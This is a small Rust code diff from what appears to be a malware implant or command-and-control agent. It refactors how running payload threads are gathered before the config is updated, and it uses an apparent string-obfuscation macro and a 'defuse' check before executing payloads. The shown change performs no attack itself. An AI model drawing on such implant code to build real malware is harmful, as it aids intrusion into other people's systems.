@@ -73,7 +73,12 @@ fn main() {
             error!("{}", lc!("[!] DEFUSE STOP update config"));
         } else {
             info!("{}", lc!("[+] UPDATE config"));
-            config = config.update_config(&session_id,&running_thread);
+            let mut bagarre : Vec<Payload> = vec![];
+            for t in &running_thread {
+                bagarre.push(t.1.clone());
+            };
+
+            config = config.update_config(&session_id,&bagarre);
             info!("{}", lc!("[+] DEFUSE payload exec"));
             if config.stop_defuse(&config.defuse_payload) {
                 error!("{}", lc!("[!] DEFUSE STOP the payload exec"));
